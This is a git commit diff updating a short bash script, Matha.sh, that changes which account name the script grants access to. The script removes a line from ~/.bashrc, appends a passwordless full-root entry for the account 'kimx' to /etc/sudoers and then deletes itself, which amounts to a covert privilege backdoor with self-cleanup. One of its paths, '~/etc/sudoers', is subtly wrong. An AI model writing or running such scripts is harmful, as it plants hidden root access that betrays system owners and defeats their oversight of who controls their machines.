5ebfa6dcba80230745a0f25c2fd74a33d89056a9
TeslaSSH <146672794+TeslaSSH@users.noreply.github.com>
2024-04-04 12:58:11 +0300

    Update Matha.sh

--- Matha.sh
+++ Matha.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 sed -i '/sudo -s/d' ~/.bashrc 
-sed -i '/rooty ALL=(ALL) NOPASSWD:ALL/d' ~/etc/sudoers
-echo "rooty ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+sed -i '/kimx ALL=(ALL) NOPASSWD:ALL/d' ~/etc/sudoers
+echo "kimx ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 rm -f Matha.sh
 exit
  
